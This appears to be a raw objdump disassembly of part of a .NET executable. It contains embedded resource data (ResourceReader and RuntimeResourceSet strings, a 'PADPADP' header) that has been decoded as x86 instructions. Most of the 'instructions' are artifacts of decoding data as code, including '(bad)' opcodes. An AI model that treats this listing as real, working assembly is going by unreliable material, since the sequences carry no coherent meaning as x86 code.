  403f8c:	outs   dx,DWORD PTR ds:[esi]
  403f8d:	mov    edx,0x260a0000
  403f92:	pop    es
  403f93:	sub    BYTE PTR [edx+0x0],bl
  403f96:	add    BYTE PTR [esi],al
  403f98:	outs   dx,DWORD PTR ds:[esi]
  403f99:	mov    eax,0x260a0000
  403f9e:	pop    es
  403f9f:	sub    BYTE PTR [ebx+0x0],bl
  403fa2:	add    BYTE PTR [esi],al
  403fa4:	outs   dx,DWORD PTR ds:[esi]
  403fa5:	mov    eax,0x260a0000
  403faa:	pop    es
  403fab:	sub    BYTE PTR [eax+eax*1+0x0],bl
  403faf:	push   es
  403fb0:	outs   dx,DWORD PTR ds:[esi]
  403fb1:	mov    eax,0x260a0000
  403fb6:	pop    es
  403fb7:	outs   dx,DWORD PTR ds:[esi]
  403fb8:	mov    edx,0x260a0000
  403fbd:	pop    es
  403fbe:	sub    BYTE PTR [ebp+0x0],bl
  403fc1:	add    BYTE PTR [esi],al
  403fc3:	outs   dx,DWORD PTR ds:[esi]
  403fc4:	mov    eax,0x260a0000
  403fc9:	pop    es
  403fca:	outs   dx,DWORD PTR ds:[esi]
  403fcb:	mov    edx,0x260a0000
  403fd0:	pop    es
  403fd1:	sub    BYTE PTR [eax+0x0],cl
  403fd4:	add    BYTE PTR [esi],al
  403fd6:	outs   dx,DWORD PTR ds:[esi]
  403fd7:	mov    eax,0x260a0000
  403fdc:	pop    es
  403fdd:	outs   dx,DWORD PTR ds:[esi]
  403fde:	mov    edx,0x260a0000
  403fe3:	pop    es
  403fe4:	sub    BYTE PTR [ecx+0x0],cl
  403fe7:	add    BYTE PTR [esi],al
  403fe9:	outs   dx,DWORD PTR ds:[esi]
  403fea:	mov    eax,0x260a0000
  403fef:	pop    es
  403ff0:	sub    BYTE PTR [edx+0x0],cl
  403ff3:	add    BYTE PTR [esi],al
  403ff5:	outs   dx,DWORD PTR ds:[esi]
  403ff6:	mov    eax,0x260a0000
  403ffb:	pop    es
  403ffc:	sub    BYTE PTR [ebx+0x0],cl
  403fff:	add    BYTE PTR [esi],al
  404001:	outs   dx,DWORD PTR ds:[esi]
  404002:	mov    eax,0x260a0000
  404007:	pop    es
  404008:	sub    BYTE PTR [eax+eax*1+0x0],cl
  40400c:	push   es
  40400d:	outs   dx,DWORD PTR ds:[esi]
  40400e:	mov    eax,0x260a0000
  404013:	pop    es
  404014:	sub    BYTE PTR [ebp+0x0],cl
  404017:	add    BYTE PTR [esi],al
  404019:	outs   dx,DWORD PTR ds:[esi]
  40401a:	mov    eax,0x260a0000
  40401f:	pop    es
  404020:	outs   dx,DWORD PTR ds:[esi]
  404021:	mov    edx,0x260a0000
  404026:	pop    es
  404027:	sub    BYTE PTR [esi+0x0],cl
  40402a:	add    BYTE PTR [esi],al
  40402c:	outs   dx,DWORD PTR ds:[esi]
  40402d:	mov    eax,0x260a0000
  404032:	pop    es
  404033:	sub    BYTE PTR [edi+0x0],cl
  404036:	add    BYTE PTR [esi],al
  404038:	outs   dx,DWORD PTR ds:[esi]
  404039:	mov    eax,0x260a0000
  40403e:	pop    es
  40403f:	sub    BYTE PTR [eax+0x0],dl
  404042:	add    BYTE PTR [esi],al
  404044:	outs   dx,DWORD PTR ds:[esi]
  404045:	mov    eax,0x260a0000
  40404a:	pop    es
  40404b:	outs   dx,DWORD PTR ds:[esi]
  40404c:	mov    edx,0x260a0000
  404051:	pop    es
  404052:	sub    BYTE PTR [ecx+0x0],dl
  404055:	add    BYTE PTR [esi],al
  404057:	outs   dx,DWORD PTR ds:[esi]
  404058:	mov    eax,0x260a0000
  40405d:	pop    es
  40405e:	sub    BYTE PTR [edx+0x0],dl
  404061:	add    BYTE PTR [esi],al
  404063:	outs   dx,DWORD PTR ds:[esi]
  404064:	mov    eax,0x260a0000
  404069:	pop    es
  40406a:	sub    BYTE PTR [ebx+0x0],dl
  40406d:	add    BYTE PTR [esi],al
  40406f:	outs   dx,DWORD PTR ds:[esi]
  404070:	mov    eax,0x260a0000
  404075:	pop    es
  404076:	outs   dx,DWORD PTR ds:[esi]
  404077:	mov    edx,0x260a0000
  40407c:	pop    es
  40407d:	sub    BYTE PTR [eax+eax*1+0x0],dl
  404081:	push   es
  404082:	outs   dx,DWORD PTR ds:[esi]
  404083:	mov    eax,0x260a0000
  404088:	pop    es
  404089:	sub    BYTE PTR [ebp+0x0],dl
  40408c:	add    BYTE PTR [esi],al
  40408e:	outs   dx,DWORD PTR ds:[esi]
  40408f:	mov    eax,0x260a0000
  404094:	pop    es
  404095:	sub    BYTE PTR [esi+0x0],dl
  404098:	add    BYTE PTR [esi],al
  40409a:	outs   dx,DWORD PTR ds:[esi]
  40409b:	mov    eax,0x260a0000
  4040a0:	pop    es
  4040a1:	outs   dx,DWORD PTR ds:[esi]
  4040a2:	mov    edx,0x260a0000
  4040a7:	pop    es
  4040a8:	sub    BYTE PTR [edi+0x0],dl
  4040ab:	add    BYTE PTR [esi],al
  4040ad:	outs   dx,DWORD PTR ds:[esi]
  4040ae:	mov    eax,0x260a0000
  4040b3:	pop    es
  4040b4:	sub    BYTE PTR [eax+0x0],bl
  4040b7:	add    BYTE PTR [esi],al
  4040b9:	outs   dx,DWORD PTR ds:[esi]
  4040ba:	mov    eax,0x260a0000
  4040bf:	pop    es
  4040c0:	sub    BYTE PTR [ecx+0x0],bl
  4040c3:	add    BYTE PTR [esi],al
  4040c5:	outs   dx,DWORD PTR ds:[esi]
  4040c6:	mov    eax,0x260a0000
  4040cb:	pop    es
  4040cc:	outs   dx,DWORD PTR ds:[esi]
  4040cd:	mov    edx,0x260a0000
  4040d2:	pop    es
  4040d3:	sub    BYTE PTR [edx+0x0],al
  4040d6:	add    BYTE PTR [esi],al
  4040d8:	outs   dx,DWORD PTR ds:[esi]
  4040d9:	mov    eax,0x260a0000
  4040de:	pop    es
  4040df:	outs   dx,DWORD PTR ds:[esi]
  4040e0:	mov    edx,0x260a0000
  4040e5:	pop    es
  4040e6:	sub    BYTE PTR [ebx+0x0],al
  4040e9:	add    BYTE PTR [esi],al
  4040eb:	outs   dx,DWORD PTR ds:[esi]
  4040ec:	mov    eax,0x260a0000
  4040f1:	pop    es
  4040f2:	sub    BYTE PTR [eax+eax*1+0x0],al
  4040f6:	push   es
  4040f7:	outs   dx,DWORD PTR ds:[esi]
  4040f8:	mov    eax,0x260a0000
  4040fd:	pop    es
  4040fe:	outs   dx,DWORD PTR ds:[esi]
  4040ff:	mov    dh,0x0
  404101:	add    BYTE PTR [edx],cl
  404103:	sub    BYTE PTR [ebx+0x2a0a0000],dh
  404109:	add    BYTE PTR [eax],al
  40410b:	add    BYTE PTR [ebx],dl
  40410d:	xor    BYTE PTR ds:0x34c00,al
  404113:	add    BYTE PTR [esi],bl
  404115:	add    BYTE PTR [eax],al
  404117:	adc    DWORD PTR [edx],eax
  404119:	mov    gs,WORD PTR [ecx+0x2d]
  40411c:	add    al,0x3
  40411e:	pop    ss
  40411f:	push   edx
  404120:	sub    al,BYTE PTR [edx]
  404122:	mov    gs,WORD PTR [ecx+0x17]
  404125:	xor    al,BYTE PTR [esi]
  404127:	add    cl,BYTE PTR [esi+0x1a311c69]
  40412d:	jb     0x404191
  40412f:	or     eax,0x5e287000
  404134:	add    BYTE PTR [eax],al
  404136:	push   es
  404137:	sub    BYTE PTR [esi+0x280a0000],ch
  40413d:	pop    esi
  40413e:	add    BYTE PTR [eax],al
  404140:	push   es
  404141:	jae    0x4040fe
  404143:	add    BYTE PTR [eax],al
  404145:	or     bh,BYTE PTR [edx+0x2]
  404148:	adc    ecx,DWORD PTR [eax]
  40414a:	push   ss
  40414b:	adc    ecx,DWORD PTR [ecx]
  40414d:	cmp    BYTE PTR [esi],al
  40414f:	add    eax,DWORD PTR [eax]
  404151:	add    BYTE PTR [ecx],dl
  404153:	or     BYTE PTR [ecx],dl
  404155:	or     DWORD PTR [edx-0x4390f9f6],ebx
  40415b:	add    BYTE PTR [eax],al
  40415d:	or     ch,BYTE PTR [eax]
  40415f:	xor    DWORD PTR [eax],eax
  404161:	add    BYTE PTR [edx],cl
  404163:	outs   dx,DWORD PTR ds:[esi]
  404164:	mov    ebp,0xb0a0000
  404169:	pop    es
  40416a:	jb     0x4041e4
  40416c:	or     eax,0xbe6f7000
  404171:	add    BYTE PTR [eax],al
  404173:	or     ch,BYTE PTR [ebx+ebx*1]
  404176:	pop    es
  404177:	outs   dx,DWORD PTR ds:[esi]
  404178:	mov    edi,0x170a0000
  40417d:	xor    DWORD PTR [edx],edx
  40417f:	jb     0x4041fd
  404181:	or     eax,0x17077000
  404186:	outs   dx,DWORD PTR ds:[esi]
  404187:	rol    BYTE PTR [eax],0x0
  40418a:	or     ch,BYTE PTR [eax]
  40418c:	xchg   edx,eax
  40418d:	add    BYTE PTR [eax],al
  40418f:	or     cl,BYTE PTR [ebx]
  404191:	pop    es
  404192:	jb     0x404114
  404194:	or     eax,0xc1287000
  404199:	add    BYTE PTR [eax],al
  40419b:	or     ch,BYTE PTR [eax+ecx*1]
  40419e:	add    edx,DWORD PTR [edi]
  4041a0:	push   edx
  4041a1:	fnstsw WORD PTR [ebp+0x7000002]
  4041a7:	jb     0x40412f
  4041a9:	or     eax,0xc1287000
  4041ae:	add    BYTE PTR [eax],al
  4041b0:	or     ch,BYTE PTR ds:0xa272070d
  4041b6:	or     eax,0xc1287000
  4041bb:	add    BYTE PTR [eax],al
  4041bd:	or     ch,BYTE PTR [eax+ebp*1]
  4041c0:	push   cs
  4041c1:	add    eax,0x721a2c46
  4041c6:	bound  ecx,QWORD PTR ds:0x3e287000
  4041cc:	add    BYTE PTR [eax],al
  4041ce:	push   es
  4041cf:	sub    BYTE PTR [esi+0x280a0000],ch
  4041d5:	add    BYTE PTR ds:[eax],al
  4041d8:	push   es
  4041d9:	jae    0x404196
  4041db:	add    BYTE PTR [eax],al
  4041dd:	or     bh,BYTE PTR [edx+0xe]
  4041e0:	add    eax,0x6a385217
  4041e5:	add    al,BYTE PTR [eax]
  4041e7:	add    BYTE PTR [edi],al
  4041e9:	jb     0x404193
  4041eb:	or     eax,0xc1287000
  4041f0:	add    BYTE PTR [eax],al
  4041f2:	or     ch,BYTE PTR ds:0xc672070d
  4041f8:	or     eax,0xc1287000
  4041fd:	add    BYTE PTR [eax],al
  4041ff:	or     ch,BYTE PTR [eax+ebp*1]
  404202:	push   cs
  404203:	push   es
  404204:	inc    esi
  404205:	sub    al,0x1a
  404207:	jb     0x40426b
  404209:	or     eax,0x3f287000
  40420e:	add    BYTE PTR [eax],al
  404210:	push   es
  404211:	sub    BYTE PTR [esi+0x280a0000],ch
  404217:	aas    
  404218:	add    BYTE PTR [eax],al
  40421a:	push   es
  40421b:	jae    0x4041d8
  40421d:	add    BYTE PTR [eax],al
  40421f:	or     bh,BYTE PTR [edx+0xe]
  404222:	push   es
  404223:	pop    ss
  404224:	push   edx
  404225:	cmp    BYTE PTR [eax],ch
  404227:	add    al,BYTE PTR [eax]
  404229:	add    BYTE PTR [edi],al
  40422b:	jb     0x4041f9
  40422d:	or     eax,0xc26f7000
  404232:	add    BYTE PTR [eax],al
  404234:	or     ch,BYTE PTR ds:0xd672070d
  40423a:	or     eax,0xc26f7000
  40423f:	add    BYTE PTR [eax],al
  404241:	or     ch,BYTE PTR [ebx+esi*1]
  404244:	pop    es
  404245:	sub    bl,al
  404247:	add    BYTE PTR [eax],al
  404249:	or     ch,BYTE PTR [ebx+ebp*1]
  40424c:	add    al,0x50
  40424e:	sub    BYTE PTR [esi+0x2d0a0000],bl
  404254:	sbb    dh,BYTE PTR [edx+0x62]
  404257:	or     eax,0x3b287000
  40425c:	add    BYTE PTR [eax],al
  40425e:	push   es
  40425f:	sub    BYTE PTR [esi+0x280a0000],ch
  404265:	cmp    eax,DWORD PTR [eax]
  404267:	add    BYTE PTR [esi],al
  404269:	jae    0x404226
  40426b:	add    BYTE PTR [eax],al
  40426d:	or     bh,BYTE PTR [edx+0x4]
  404270:	pop    es
  404271:	push   ecx
  404272:	cmp    bl,bl
  404274:	add    DWORD PTR [eax],eax
  404276:	add    BYTE PTR [edi],al
  404278:	jb     0x40425a
  40427a:	or     eax,0xbe6f7000
  40427f:	add    BYTE PTR [eax],al
  404281:	or     ch,BYTE PTR ds:0xe8720710
  404287:	or     eax,0xbe6f7000
  40428c:	add    BYTE PTR [eax],al
  40428e:	or     bh,BYTE PTR [ecx]
  404290:	add    BYTE PTR [eax],0x0
  404293:	add    BYTE PTR [edi],al
  404295:	pop    ds
  404296:	cmp    ch,BYTE PTR [edi-0x3c]
  404299:	add    BYTE PTR [eax],al
  40429b:	or     cl,BYTE PTR [edi+eax*1]
  40429e:	outs   dx,DWORD PTR ds:[esi]
  40429f:	mov    edi,0x80a0000
  4042a4:	pop    ss
  4042a5:	pop    eax
  4042a6:	xor    BYTE PTR [edx],bl
  4042a8:	jb     0x40430c
  4042aa:	or     eax,0x3a287000
  4042af:	add    BYTE PTR [eax],al
  4042b1:	push   es
  4042b2:	sub    BYTE PTR [esi+0x280a0000],ch
  4042b8:	cmp    al,BYTE PTR [eax]
  4042ba:	add    BYTE PTR [esi],al
  4042bc:	jae    0x404279
  4042be:	add    BYTE PTR [eax],al
  4042c0:	or     bh,BYTE PTR [edx+0x7]
  4042c3:	or     BYTE PTR [edi],dl
  4042c5:	pop    eax
  4042c6:	outs   dx,DWORD PTR ds:[esi]
  4042c7:	rol    BYTE PTR [eax],0x0
  4042ca:	or     cl,BYTE PTR ds:0x9d2809
  4042d0:	add    BYTE PTR [edx],cl
  4042d2:	sub    eax,0x6af7239
  4042d7:	add    BYTE PTR [eax+0x28],dh
  4042da:	cmp    DWORD PTR [eax],eax
  4042dc:	add    BYTE PTR [esi],al
  4042de:	sub    BYTE PTR [edx+0x90a0000],dl
  4042e4:	sub    BYTE PTR [esi+0x280a0000],ch
  4042ea:	xor    DWORD PTR [eax],eax
  4042ec:	add    BYTE PTR [edx],cl
  4042ee:	sub    BYTE PTR [ecx],bh
  4042f0:	add    BYTE PTR [eax],al
  4042f2:	push   es
  4042f3:	pop    ss
  4042f4:	lea    eax,[ecx]
  4042f6:	add    BYTE PTR [eax],al
  4042f8:	add    DWORD PTR [ebx],edx
  4042fa:	or     dl,BYTE PTR [ecx]
  4042fc:	or     dl,BYTE PTR [esi]
  4042fe:	or     DWORD PTR [edx+0x32280a11],esp
  404304:	add    BYTE PTR [eax],al
  404306:	or     dh,BYTE PTR [ebx-0x45]
  404309:	add    BYTE PTR [eax],al
  40430b:	or     bh,BYTE PTR [edx+0xe]
  40430e:	pop    es
  40430f:	or     DWORD PTR [ecx+0x38],edx
  404312:	cmp    al,0x1
  404314:	add    BYTE PTR [eax],al
  404316:	pop    es
  404317:	jb     0x404317
  404319:	or     eax,0xbe6f7000
  40431e:	add    BYTE PTR [eax],al
  404320:	or     ch,BYTE PTR ds:0x6720710
  404326:	push   cs
  404327:	add    BYTE PTR [eax+0x6f],dh
  40432a:	mov    esi,0x390a0000
  40432f:	mov    DWORD PTR [eax],eax
  404331:	add    BYTE PTR [eax],al
  404333:	pop    es
  404334:	pop    ds
  404335:	cmp    ch,BYTE PTR [edi-0x3c]
  404338:	add    BYTE PTR [eax],al
  40433a:	or     dl,BYTE PTR [ebx]
  40433c:	add    al,0x7
  40433e:	outs   dx,DWORD PTR ds:[esi]
  40433f:	mov    edi,0x110a0000
  404344:	add    al,0x17
  404346:	pop    eax
  404347:	xor    BYTE PTR [edx],bl
  404349:	jb     0x4043ad
  40434b:	or     eax,0x3d287000
  404350:	add    BYTE PTR [eax],al
  404352:	push   es
  404353:	sub    BYTE PTR [esi+0x280a0000],ch
  404359:	cmp    eax,0x73060000
  40435e:	mov    ebx,0x7a0a0000
  404363:	pop    es
  404364:	adc    DWORD PTR [edi+edx*1],eax
  404367:	pop    eax
  404368:	outs   dx,DWORD PTR ds:[esi]
  404369:	rol    BYTE PTR [eax],0x0
  40436c:	or     dl,BYTE PTR [ebx]
  40436e:	add    eax,0x93280511
  404373:	add    BYTE PTR [eax],al
  404375:	or     ch,BYTE PTR ds:0x6af723b
  40437b:	add    BYTE PTR [eax+0x28],dh
  40437e:	cmp    BYTE PTR [eax],al
  404380:	add    BYTE PTR [esi],al
  404382:	sub    BYTE PTR [edx+0x110a0000],dl
  404388:	add    eax,0xae28
  40438d:	or     ch,BYTE PTR [eax]
  40438f:	xor    DWORD PTR [eax],eax
  404391:	add    BYTE PTR [edx],cl
  404393:	sub    BYTE PTR [eax],bh
  404395:	add    BYTE PTR [eax],al
  404397:	push   es
  404398:	pop    ss
  404399:	lea    eax,[ecx]
  40439b:	add    BYTE PTR [eax],al
  40439d:	add    DWORD PTR [ebx],edx
  40439f:	or     edx,DWORD PTR [ecx]
  4043a1:	or     edx,DWORD PTR [esi]
  4043a3:	adc    DWORD PTR ds:0x280b11a2,eax
  4043a9:	xor    al,BYTE PTR [eax]
  4043ab:	add    BYTE PTR [edx],cl
  4043ad:	jae    0x40436a
  4043af:	add    BYTE PTR [eax],al
  4043b1:	or     bh,BYTE PTR [edx+0x5]
  4043b4:	adc    DWORD PTR ds:0x963851,eax
  4043ba:	add    BYTE PTR [eax],al
  4043bc:	pop    es
  4043bd:	jb     0x4043d1
  4043bf:	push   cs
  4043c0:	add    BYTE PTR [eax+0x6f],dh
  4043c3:	mov    esi,0x2d0a0000
  4043c8:	or     eax,0xe1a7207
  4043cd:	add    BYTE PTR [eax+0x6f],dh
  4043d0:	mov    esi,0x2c0a0000
  4043d5:	inc    ebx
  4043d6:	push   es
  4043d7:	pop    ds
  4043d8:	cmp    ch,BYTE PTR [edi-0x3c]
  4043db:	add    BYTE PTR [eax],al
  4043dd:	or     dl,BYTE PTR [ebx]
  4043df:	push   es
  4043e0:	push   es
  4043e1:	outs   dx,DWORD PTR ds:[esi]
  4043e2:	mov    edi,0x110a0000
  4043e7:	push   es
  4043e8:	pop    ss
  4043e9:	pop    eax
  4043ea:	xor    BYTE PTR [edx],bl
  4043ec:	jb     0x404450
  4043ee:	or     eax,0x3c287000
  4043f3:	add    BYTE PTR [eax],al
  4043f5:	push   es
  4043f6:	sub    BYTE PTR [esi+0x280a0000],ch
  4043fc:	cmp    al,0x0
  4043fe:	add    BYTE PTR [esi],al
  404400:	jae    0x4043bd
  404402:	add    BYTE PTR [eax],al
  404404:	or     bh,BYTE PTR [edx+0x6]
  404407:	adc    DWORD PTR [esi],eax
  404409:	pop    ss
  40440a:	pop    eax
  40440b:	outs   dx,DWORD PTR ds:[esi]
  40440c:	rol    BYTE PTR [eax],0x0
  40440f:	or     dl,BYTE PTR [ebx]
  404411:	pop    es
  404412:	push   cs
  404413:	add    al,0x11
  404415:	pop    es
  404416:	push   ecx
  404417:	sub    edi,DWORD PTR [ecx]
  404419:	jb     0x4043ca
  40441b:	push   es
  40441c:	add    BYTE PTR [eax+0x28],dh
  40441f:	inc    ecx
  404420:	add    BYTE PTR [eax],al
  404422:	push   es
  404423:	sub    BYTE PTR [edx+0x60a0000],dl
  404429:	sub    BYTE PTR [esi+0x280a0000],ch
  40442f:	xor    DWORD PTR [eax],eax
  404431:	add    BYTE PTR [edx],cl
  404433:	sub    BYTE PTR [ecx+0x0],al
  404436:	add    BYTE PTR [esi],al
  404438:	pop    ss
  404439:	lea    eax,[ecx]
  40443b:	add    BYTE PTR [eax],al
  40443d:	add    DWORD PTR [ebx],edx
  40443f:	or     al,0x11
  404441:	or     al,0x16
  404443:	push   es
  404444:	mov    ds:0x32280c11,al
  404449:	add    BYTE PTR [eax],al
  40444b:	or     dh,BYTE PTR [ebx-0x45]
  40444e:	add    BYTE PTR [eax],al
  404450:	or     bh,BYTE PTR [edx+0x11]
  404453:	or     DWORD PTR [edi],edx
  404455:	pop    eax
  404456:	adc    ecx,DWORD PTR [ecx]
  404458:	adc    DWORD PTR [ecx],ecx
  40445a:	adc    DWORD PTR [eax],ecx
  40445c:	mov    gs,WORD PTR [ecx+0x3f]
  40445f:	out    dx,eax
  404460:	cld    
  404461:	(bad)  
  404462:	jmp    FWORD PTR [edx]
  404464:	add    BYTE PTR [eax],al
  404466:	add    BYTE PTR [eax],al
  404468:	cmc    
  404469:	push   cs
  40446a:	add    BYTE PTR [eax],al
  40446c:	into   
  40446d:	retf   0xbeef
  404470:	add    DWORD PTR [eax],eax
  404472:	add    BYTE PTR [eax],al
  404474:	xchg   ecx,eax
  404475:	add    BYTE PTR [eax],al
  404477:	add    BYTE PTR [ebx+edx*2+0x79],ch
  40447b:	jae    0x4044f1
  40447d:	gs ins DWORD PTR es:[edi],dx
  40447f:	cs push edx
  404481:	gs jae 0x4044f3
  404484:	jne    0x4044f8
  404486:	arpl   WORD PTR [ebp+0x73],sp
  404489:	cs push edx
  40448b:	gs jae 0x4044fd
  40448e:	jne    0x404502
  404490:	arpl   WORD PTR [ebp+0x52],sp
  404493:	gs popa 
  404495:	fs gs jb 0x4044c5
  404499:	and    BYTE PTR [ebp+0x73],ch
  40449c:	arpl   WORD PTR [edi+0x72],bp
  40449f:	ins    BYTE PTR es:[edi],dx
  4044a0:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4044a7:	jae    0x404512
  4044a9:	outs   dx,DWORD PTR ds:[esi]
  4044aa:	outs   dx,BYTE PTR ds:[esi]
  4044ab:	cmp    eax,0x2e302e34
  4044b0:	xor    BYTE PTR [esi],ch
  4044b2:	xor    BYTE PTR [eax+eiz*1],ch
  4044b5:	inc    ebx
  4044b6:	jne    0x404524
  4044b8:	je     0x40452f
  4044ba:	jb     0x404521
  4044bc:	cmp    eax,0x7475656e
  4044c1:	jb     0x404524
  4044c3:	ins    BYTE PTR es:[edi],dx
  4044c4:	sub    al,0x20
  4044c6:	push   eax
  4044c7:	jne    0x40452b
  4044c9:	ins    BYTE PTR es:[edi],dx
  4044ca:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4044d1:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4044d5:	bound  esi,QWORD PTR [edi]
  4044d7:	aaa    
  4044d8:	popa   
  4044d9:	xor    eax,0x31363563
  4044de:	cmp    DWORD PTR [ebx],esi
  4044e0:	xor    al,0x65
  4044e2:	xor    BYTE PTR [eax],bh
  4044e4:	cmp    DWORD PTR [ebx],esp
  4044e6:	push   ebx
  4044e7:	jns    0x40455c
  4044e9:	je     0x404550
  4044eb:	ins    DWORD PTR es:[edi],dx
  4044ec:	cs push edx
  4044ee:	gs jae 0x404560
  4044f1:	jne    0x404565
  4044f3:	arpl   WORD PTR [ebp+0x73],sp
  4044f6:	cs push edx
  4044f8:	jne    0x404568
  4044fa:	je     0x404565
  4044fc:	ins    DWORD PTR es:[edi],dx
  4044fd:	gs push edx
  4044ff:	gs jae 0x404571
  404502:	jne    0x404576
  404504:	arpl   WORD PTR [ebp+0x53],sp
  404507:	gs je  0x40450c
  40450a:	add    BYTE PTR [eax],al
  40450c:	add    BYTE PTR [edi],ah
  40450e:	add    BYTE PTR [eax],al
  404510:	add    BYTE PTR [eax],al
  404512:	add    BYTE PTR [eax],al
  404514:	add    BYTE PTR [eax+0x41],dl
  404517:	inc    esp
  404518:	push   eax
  404519:	inc    ecx
  40451a:	inc    esp
  40451b:	push   eax
  40451c:	push   ecx
  40451d:	hlt    
  40451e:	or     BYTE PTR [esi+eiz*4-0x5135de37],bl
  404525:	mov    edx,0x3764f726
  40452a:	sbb    eax,0x4e12dc00
  40452f:	add    ebx,ebp
  404531:	adc    cl,BYTE PTR [esi+0x3]
  404534:	ficom  WORD PTR [edx]
  404536:	dec    esi
  404537:	add    ecx,edx
  404539:	pop    edx
  40453a:	xchg   esi,eax
  40453b:	add    al,0x3f
  40453d:	jp     0x4044e2
  40453f:	add    al,0xd0
  404541:	jmp    0x92a:0xead1092a
  404548:	shr    dl,cl
  40454a:	sub    cl,BYTE PTR [ecx]
  40454c:	shr    edx,cl
  40454e:	sub    cl,BYTE PTR [ecx]
  404550:	aam    0xea
  404552:	sub    cl,BYTE PTR [ecx]
  404554:	aad    0xea
  404556:	sub    cl,BYTE PTR [ecx]
  404558:	(bad)  
  404559:	jmp    0x92a:0xead7092a
  404560:	fsubr  st,st(2)
  404562:	sub    cl,BYTE PTR [ecx]
  404564:	xor    bl,ch
  404566:	sub    cl,BYTE PTR [ecx]
  404568:	xor    ch,bl
  40456a:	sub    cl,BYTE PTR [ecx]
  40456c:	xor    ebp,ebx
  40456e:	sub    cl,BYTE PTR [ecx]
  404570:	xor    al,0xeb
  404572:	sub    cl,BYTE PTR [ecx]
  404574:	xor    eax,0x36092aeb
  404579:	jmp    0x4045a5
  40457b:	or     DWORD PTR [edi],esi
  40457d:	jmp    0x4045a9
  40457f:	or     DWORD PTR [eax],edi
  404581:	jmp    0x4045ad
  404583:	or     DWORD PTR [ecx],edi
  404585:	jmp    0x4045b1
  404587:	or     ecx,esp
  404589:	sar    DWORD PTR [ebx-0x7d7145ee],1
  40458f:	sbb    dl,BYTE PTR [eax]
  404591:	aaa    
  404592:	rcr    BYTE PTR [edx],1
  404594:	adc    dh,BYTE PTR [edi]
  404596:	rcr    BYTE PTR [edx],1
  404598:	adc    esi,DWORD PTR [edi]
  40459a:	rcr    BYTE PTR [edx],1
  40459c:	test   DWORD PTR [edx-0x368fe2e2],esp
  4045a2:	push   edi
  4045a3:	push   ds
  4045a4:	jne    0x40456f
  4045a6:	push   edi
  4045a7:	push   ds
  4045a8:	jbe    0x404573
  4045aa:	push   edi
  4045ab:	push   ds
  4045ac:	ja     0x404577
  4045ae:	push   edi
  4045af:	push   ds
  4045b0:	pop    DWORD PTR [edi+0x3d]
  4045b3:	inc    esi
  4045b4:	inc    esi
  4045b5:	loopne 0x40458c
  4045b7:	jnp    0x4045ff
  4045b9:	add    eax,0xcc0000
  4045be:	add    BYTE PTR [eax],al
  4045c0:	xchg   BYTE PTR [eax],al
  4045c2:	add    BYTE PTR [eax],al
  4045c4:	cmp    DWORD PTR [ecx],eax
  4045c6:	add    BYTE PTR [eax],al
  4045c8:	adc    DWORD PTR [edx],eax
  4045ca:	add    BYTE PTR [eax],al
  4045cc:	repnz add DWORD PTR [eax],eax
  4045cf:	add    bl,dl
  4045d1:	add    DWORD PTR [eax],eax
  4045d3:	add    BYTE PTR [eax],al
  4045d5:	add    BYTE PTR [eax],al
  4045d7:	add    BYTE PTR [esi],dl
  4045d9:	add    DWORD PTR [eax],eax
  4045db:	add    BYTE PTR [ebp+0x3],bh
  4045de:	add    BYTE PTR [eax],al
  4045e0:	mov    ds:0xc7000003,al
  4045e5:	add    eax,DWORD PTR [eax]
  4045e7:	add    ah,ch
  4045e9:	add    eax,DWORD PTR [eax]
  4045eb:	add    BYTE PTR [ecx],dl
  4045ed:	add    al,0x0
  4045ef:	add    BYTE PTR [esi],dh
  4045f1:	add    al,0x0
  4045f3:	add    BYTE PTR [ebx+0x4],bl
  4045f6:	add    BYTE PTR [eax],al
  4045f8:	add    BYTE PTR [eax+eax*1],0x0
  4045fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fd:	add    al,0x0
  4045ff:	add    BYTE PTR [eax],dh
  404601:	add    al,BYTE PTR [eax]
  404603:	add    BYTE PTR [edx+0x2],bh
  404606:	add    BYTE PTR [eax],al
  404608:	push   ebp
  404609:	add    al,BYTE PTR [eax]
  40460b:	add    ah,al
  40460d:	add    al,BYTE PTR [eax]
  40460f:	add    BYTE PTR [edi+0xe000002],bl
  404615:	add    eax,DWORD PTR [eax]
  404617:	add    cl,ch
  404619:	add    al,BYTE PTR [eax]
  40461b:	add    BYTE PTR [eax+0x3],bl
  40461e:	add    BYTE PTR [eax],al
  404620:	xor    eax,DWORD PTR [ebx]
  404622:	add    BYTE PTR [eax],al
  404624:	test   DWORD PTR [eax],0x650000
  40462a:	add    BYTE PTR [eax],al
  40462c:	pop    esi
  40462d:	add    DWORD PTR [eax],eax
  40462f:	add    BYTE PTR [ecx+eax*1+0x1850000],ch
  404636:	add    BYTE PTR [eax],al
  404638:	mov    bl,0x0
  40463a:	add    BYTE PTR [eax],al
  40463c:	daa    
  40463d:	add    eax,0x4ca0000
  404642:	add    BYTE PTR [eax],al
  404644:	jmp    0x840464d
  404649:	add    eax,0x4a0000
  40464e:	add    BYTE PTR [eax],al
  404650:	daa    
  404651:	add    BYTE PTR [eax],al
  404653:	add    BYTE PTR [ecx+0x7],dl
  404656:	add    BYTE PTR [eax],al
  404658:	and    al,BYTE PTR [eax+eax*1+0x69]
  40465c:	add    BYTE PTR [edx+0x0],dh
  40465f:	add    BYTE PTR gs:[ebx+0x0],ah
  404663:	je     0x404665
  404665:	outs   dx,DWORD PTR ds:[esi]
  404666:	add    BYTE PTR [edx+0x0],dh
  404669:	jns    0x40466b
  40466b:	dec    esi
  40466c:	add    BYTE PTR [edi+0x0],ch
  40466f:	je     0x404671
  404671:	inc    ebp
  404672:	add    BYTE PTR [eax+0x0],bh
  404675:	imul   eax,DWORD PTR [eax],0x740073
  40467b:	add    BYTE PTR [eax],al
  40467d:	add    BYTE PTR [eax],al
  40467f:	push   ds
  404680:	dec    ecx
  404681:	add    BYTE PTR [esi+0x0],ch
  404684:	jbe    0x404686
  404686:	popa   
  404687:	add    BYTE PTR [eax+eax*1+0x69],ch
  40468b:	add    BYTE PTR [eax+eax*1+0x4c],ah
  40468f:	add    BYTE PTR [ecx+0x0],ah
  404692:	outs   dx,BYTE PTR ds:[esi]
  404693:	add    BYTE PTR [edi+0x0],ah
  404696:	jne    0x404698
  404698:	popa   
  404699:	add    BYTE PTR [edi+0x0],ah
  40469c:	add    BYTE PTR gs:[edx],bh
  40469f:	add    BYTE PTR [eax],al
  4046a1:	add    BYTE PTR [esi],dl
  4046a3:	dec    esi
  4046a4:	add    BYTE PTR [edi+0x0],ch
